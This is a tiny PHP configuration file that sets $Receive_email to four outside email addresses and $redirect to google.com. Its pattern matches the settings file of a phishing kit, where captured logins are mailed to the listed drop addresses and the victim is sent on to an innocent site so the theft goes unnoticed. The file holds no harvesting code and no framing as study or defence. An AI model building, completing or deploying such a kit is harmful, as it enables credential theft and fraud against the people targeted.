<?php 
$Receive_email="admin@marksandson.com,manchesterexecutives@ivancleaningllcn.com,contact@ryanmillerfoundation.com,united@whitereadynews.com";
$redirect="https://www.google.com/";
?>